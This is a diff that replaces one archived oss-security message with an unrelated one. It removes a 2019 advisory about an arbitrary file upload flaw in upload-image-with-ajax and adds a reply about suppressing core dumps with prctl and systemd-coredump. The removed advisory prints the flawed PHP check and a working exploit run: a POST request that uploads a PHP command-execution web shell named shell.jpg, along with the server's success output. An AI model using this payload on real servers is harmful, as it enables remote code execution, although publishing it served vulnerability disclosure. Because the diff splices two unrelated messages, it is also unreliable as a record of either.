@@ -1,82 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/12/23/2
-Message-ID: <3894D4AF-10B8-46F7-BAF5-C800F8FCFE20@me.com>
-Date: Mon, 23 Dec 2019 16:52:05 -0500
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Security <oss-security@...ts.openwall.com>
-Subject: Re: Arbitrary file upload vulnerability in upload-image-with-ajax v1.0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/01/01/7
+Message-ID: <20190101124110.GA15804@espresso.pseudorandom.co.uk>
+Date: Tue, 1 Jan 2019 12:41:10 +0000
+From: Simon McVittie <smcv@...ian.org>
+To: oss-security@...ts.openwall.com
+Cc: Jeffrey Walton <noloader@...il.com>, gmp-bugs@...lib.org
+Subject: Re: Re: Asserts considered harmful (or GMP spills its sensitive information)
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+On Tue, 01 Jan 2019 at 12:07:17 +0100, Niels Möller wrote:
+> A security sensitive application can easily disable generation of core
+> files, using setrlimit (on the linux kernel, prctl may also be useful).
 
-An update and a correction.
+If you want to avoid core dumps being recorded on Linux in the presence of
+system configuration that writes them into a pipe to a command instead
+of to a core file (systemd-coredump, corekeeper, abrt, apport etc.,
+using a string starting with | in /proc/sys/kernel/core_pattern), then
+you need to use prctl PR_SET_DUMPABLE. Setting RLIMIT_CORE to 0 prevents
+the kernel from creating core dump files itself, but does not prevent
+it from writing them to pipes.
 
-The CVE number should be CVE-2019-8293.  The software author also has fixed the vulnerability:
+It might be helpful to look at a recent version of dbus, which has a
+reasonably portable implementation of "don't write core dumps", in a unit
+test helper program that deliberately segfaults (so that the actual unit
+test can assert that a segfaulting child process is handled correctly).
+This was implemented to avoid core-collecting programs wasting time and
+I/O bandwidth during unit test runs, rather than to avoid information
+leaks, but the procedure is the same.
 
-https://github.com/abcprintf/upload-image-with-ajax/commit/71436ba5102010397519d4b25ea57591cfb4974c
+Some processes (including those that are setuid or setgid, I think?) are
+automatically undumpable.
 
-Thanks,
-Larry
+> And besides, most systems have zero ulimit -c as the system default
+> these days
 
-﻿On 12/23/19, 12:09 PM, "Larry W. Cashdollar" <larry0@...com> wrote:
+As noted above, this does not prevent writing the cores to pipes
+(precisely to make crash-recording services like systemd-coredump more
+useful).
 
-    Title: Arbitrary file upload vulnerability in upload-image-with-ajax
-    Author: Larry W. Cashdollar
-    Date: 2019-12-16
-    CVE-ID:[CVE-2019-8292]
-    Download Site: https://github.com/abcprintf/upload-image-with-ajax/
-    Vendor: adcprintf
-    Vendor Notified: 2019-12-16
-    Vendor Contact: wh.cprintf@...il.com
-    Advisory: http://www.vapidlabs.com/advisory.php?v=211
-    Description: upload-image-with-ajax
-    Vulnerability:
-    The code below changes the $ready flag to true if the file conforms to the size of < 1000000. Reversing the check that the file is an image. So, a .php file can be uploaded with only a warning allowing code execution.
-    
-    $ready = false;
-    if((($imageType == "image/jpeg") || ($imageType == "image/jpg") || ($imageType == "image/png"))&&in_array($fileExt, $validext)){
-    $ready = true;
-    }else{
-    echo "was not an image
-    ";
-    /You should abort the upload right here/
-    }
-    if($_FILES["fileUpload"]["size"] < 1000000){
-    $ready = true;
-    echo "file size is ".$_FILES['fileUpload']["size"]."
-    ";
-    }else{
-    echo "file was TOO BIG!";
-    }
-    
-    Exploit Code:
-     $ ./fileupload_exploit 192.168.0.3 80 /upload-image-with-ajax/upload.php
-    POST request size is 469 bytes
-     
-    Sending Payload:
-    POST //upload-image-with-ajax/upload.php HTTP/1.1
-    Host: 192.168.0.3
-    User-Agent: File Upload Exploiter/v1.2
-    Accept: */*
-    Content-Length: 237
-    Content-Type: multipart/form-data; boundary=------------------------c8e05c8871143853
-     
-    --------------------------c8e05c8871143853
-    Content-Disposition: form-data; name="fileUpload"; filename="shell.jpg"
-    Content-Type: image/jpeg
-     
-    <?php $cmd=$_GET['cmd']; system($cmd);?>
-     
-    --------------------------c8e05c8871143853--
-     
-    HTTP/1.1 200 OK
-    Date: Mon, 16 Dec 2019 04:39:56 GMT
-    Server: Apache/2.4.25 (Debian)
-    Content-Length: 37
-    Content-Type: text/html; charset=UTF-8
-     
-    file size is 42<br>upload successful!
-    [+] Total bytes read: 185
-    
+> to get proper core dumps, including
+> disabling the core dump collection "services" you mention
 
+Crash-recording services should be able to provide a way to extract
+the core from wherever they saved it, for example `coredumpctl -o... dump`
+with systemd-coredump.
 
+    smcv
